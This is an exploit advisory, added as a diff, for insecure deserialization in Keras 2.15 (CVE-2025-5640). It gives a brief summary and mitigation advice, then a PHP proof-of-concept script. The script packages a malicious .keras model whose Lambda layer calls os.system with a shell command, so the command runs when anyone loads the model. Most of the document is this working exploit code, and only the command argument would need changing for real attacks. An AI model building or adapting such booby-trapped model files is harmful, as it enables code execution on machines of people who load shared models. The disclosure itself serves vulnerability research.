@@ -1,0 +1,75 @@
+=============================================================================================================================================
+| # Title     : Keras 2.15 insecure deserialization                                                                                         |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://keras.io/                                                                                                           |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/202894/ &  	CVE-2025-5640
+
+[+] Summary : 
+
+A security issue in certain versions of Keras allows attackers to craft a malicious model file (typically a .keras or HDF5-based model) 
+containing unsafe serialization primitives. When such a model is loaded, the deserialization process may allow execution of arbitrary functions 
+or system commands if unsafe layers such as Lambda with custom functions are used.
+This issue arises because the framework may deserialize user-defined functions without full sandboxing or validation, enabling attackers to embed object configurations that trigger execution during model loading.
+Mitigation requires strict disabling of custom object loading, enforcing safe-load mechanisms, updating to patched versions, and avoiding untrusted model files
+              
+			
+[+]  POC : php poc.php
+
+<?php
+class SimpleKerasExploit {
+    public function createMaliciousModel($outputFile = "malicious_model.keras") {
+        $tempDir = sys_get_temp_dir() . '/keras_' . uniqid();
+        mkdir($tempDir, 0755, true);
+        
+        // Create config
+        $config = array(
+            "class_name" => "Functional",
+            "config" => array(
+                "name" => "pwned_model",
+                "layers" => array(
+                    array(
+                        "class_name" => "Lambda",
+                        "config" => array(
+                            "name" => "evil_lambda",
+                            "function" => array(
+                                "class_name" => "function",
+                                "config" => array(
+                                    "module" => "os",
+                                    "function_name" => "system",
+                                    "registered_name" => null
+                                )
+                            ),
+                            "arguments" => array('touch /tmp/pwned_simple.keras')
+                        )
+                    )
+                )
+            )
+        );
+        
+        file_put_contents($tempDir . '/config.json', json_encode($config));
+        file_put_contents($tempDir . '/metadata.json', json_encode(array("keras_version" => "2.15.0")));
+        
+        $zip = new ZipArchive();
+        if ($zip->open($outputFile, ZipArchive::CREATE) === TRUE) {
+            $zip->addFile($tempDir . '/config.json', 'config.json');
+            $zip->addFile($tempDir . '/metadata.json', 'metadata.json');
+            $zip->close();
+            echo "✅ Malicious model created: $outputFile\n";
+        }
+        
+        // Cleanup
+        array_map('unlink', glob("$tempDir/*"));
+        rmdir($tempDir);
+    }
+}
+
+$exploit = new SimpleKerasExploit();
+$exploit->createMaliciousModel();
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
